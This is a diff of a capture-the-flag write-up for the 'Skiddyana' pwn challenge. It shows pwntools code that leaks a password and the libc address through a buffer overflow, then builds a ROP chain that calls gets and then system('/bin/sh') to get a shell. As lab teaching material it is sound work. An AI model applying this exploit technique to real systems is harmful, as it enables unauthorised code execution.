@@ -1,18 +1,16 @@
 # Skiddyana Pwnz and the Loom of Fate 
 
 Hello, here is an unintended solution for the Skiddyana challenge which was supposed to be a tipical ret2win, but i didn't see that function so i did a complete exploit
-So started by running checksec
 
-![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/45db0a5c-2670-400d-b6d5-0d834f32553b)
-
+<div align="center">
+	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/45db0a5c-2670-400d-b6d5-0d834f32553b"></img>
+</div>
 We can see that we are not allowed to run shellcode, but there is no PIE which we will see later that's pretty good.
 After this we can take a look at the code with ghidra
 
 ```c
 
-void main(void)
-
-{
+void main(void) {
   int iVar1;
   size_t len;
   undefined8 uStack592;
@@ -135,7 +133,7 @@ char * loomRoom(char *param_1,char *param_2) {
 
 ```
 
-Here is the function that let us to leak the password and even the libc used in order to access the fatesRoom, we are not able to write over the ret-address because it's to far
+Here is the function that let us to leak the password and even the libc used in order to access the fatesRoom, that's all we can do because we are not able to write over the ret-address because it's to far
 
 ```c
 
@@ -209,47 +207,53 @@ By the way let's start by leaking the password and the libc with the overflow
 As you can see from the image above we just need to write a pad of **0x110** bytes and then write the address that we want to leak, as i did in the code below
 
 ```python
-	def Leak(to_leak):
-    payload = flat(
-        b"a" * 0x118,
-        to_leak,
-    )
-
-    roomOfLoom(payload)
-    print_()
-
-    p.recvuntil(b"ancient : \n")
-    p.recvline()
-
-    leak = p.recvline()
-    try:
-        leak = u64(leak.strip().ljust(8, b"\x00"))
-        return leak
-    except:
-        return leak.strip().decode()
+    def Leak(to_leak):
+	    payload = flat(
+	        b"a" * 0x118,
+	        to_leak,
+	    )
+	
+	    roomOfLoom(payload)
+	    print_()
+	
+	    p.recvuntil(b"ancient : \n")
+	    p.recvline()
+	
+	    leak = p.recvline()
+	    try:
+	        leak = u64(leak.strip().ljust(8, b"\x00"))
+	        return leak
+	    except:
+	        return leak.strip().decode()
 ```
 
-That's the function which i adapted in order to make it suitable for a password leak and even for an address leak
-I made two different calls of it, one with puts from the got and the other with the static address of the stored password or **0x40232a**, because there is no PIE
+That's the function which i adapted in order to make it suitable for a password leak and even for an address one
 
-![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/aebbe86b-6cd6-49b6-bee1-c4a7e67eee86)
-
-With the libc leak we are even able to retrieve the libc thanks to (**libc.blukat**)[https://libc.blukat.me/]
+I made two different calls of it, one with puts from the got and the other with the static address of the stored password or `0x40232a`, because there is no PIE
+<div align="center">
+	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/aebbe86b-6cd6-49b6-bee1-c4a7e67eee86"></img>
+</div>
+With the libc leak of puts we are even able to retrieve the libc version and with that the base, thanks to [`libc.blukat`](https://libc.blukat.me/)
 
 ![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/50353574-6286-419f-92fa-98767b15de6b)
 
 Now we are able to access the fatesRoom where we can get an overflow of a single address to land where we need. 
+
 The first thought was to jump over one_gadget but none of the given were affordable, because of the too restricted rules, so tried with a different approach
 
-![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/0285f512-1197-47ce-b01d-4c0df8f3d555)
+<div align="center">
+	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/0285f512-1197-47ce-b01d-4c0df8f3d555"></img>
+</div>
 
-As you can see all the registers were pointing to the buffer, so we can think that the call to system with the string **/bin/sh** in the buffer is the way, but it is not because of the **strcpy** which avoid to print over the NULL terminated string.
+As you can see all the registers were pointing to the buffer, so we can think that the call to system with the string `/bin/sh` in the buffer is the way, but it is not because of the `strcpy` which avoid to print over the NULL terminated string.
 
-After some struggle i came with the solution of calling the **gets** function from the libc because we already have the **RDI** set to the buffer, like this we are able to write as many bytes we want
+After some struggle i came with the solution of calling the `gets` function from the libc because we already have the `RDI` set to the buffer, like this we are able to write as many bytes we want
 
-![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/d149b229-c0d7-4b09-8252-c964de9d7cd7)
+<div align="center">
+	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/d149b229-c0d7-4b09-8252-c964de9d7cd7"></img>
+</div>
 
-And it worked! We just have small problem or that we start write pas the the first byte, like this we are not able to us the first address as we want, but we just need to find a gadget that return with the same base, which is kinda simple, because we have the libc
+And it worked! We just have small problem or that we start write past the the first byte, like this we are not able to us the first address as we want, but we just need to find a gadget that return with the same base, which is kinda simple, because we have the libc
 
 ```diff
 	0x000000000009d114 : or dword ptr [rdi + 0x30c], 0x40 ; jmp 0x9d0d8
@@ -258,29 +262,28 @@ And it worked! We just have small problem or that we start write pas the the fir
 	0x00000000000c6114 : shr byte ptr [rdx], 0x4c ; lea ecx, [rsp + 0x18] ; call r13
 	0x0000000000155114 : stc ; call rbp
 ```
-That's perfect because it does a simple operation and then return, so now we can build our rop
+That's perfect because it does a simple operation and then return, so now we can build the real our rop
 
 ```python
 	address_14_offset = 0x3b114 + libc.address
-    ret = rop.find_gadget(['ret'])[0]
-    pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
-    bin_sh = next(libc.search(b"/bin/sh\x00"))
-    system = libc.symbols['system']
+	ret = rop.find_gadget(['ret'])[0]
+	pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
+	bin_sh = next(libc.search(b"/bin/sh\x00"))
+	system = libc.symbols['system']
 
 	call_system = flat(
-        address_14_offset,
-        ret,
-        pop_rdi,
-        bin_sh,
-        system,
-    )
+	        address_14_offset,
+	        ret,
+	        pop_rdi,
+	        bin_sh,
+	        system,
+   	 )
 ```
 
 And when we run it
 
 ![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/109754d1-cca6-4f97-a326-173bec6709ea)
 
-Like this we are able to get a shell, of course with the intended way, this was way faster, because we just had to insert the function **theVoid** over the **gets** call 
+Like this we are able to get a shell, of course with the intended way, this was way faster, because we just had to insert the function `theVoid` over the `gets` call, but like this it was even more interesting ;)
 
-Ty for the attention hope to see you again :)
-0xCY@
+Ty for the attention hope to see you again 0xCY@
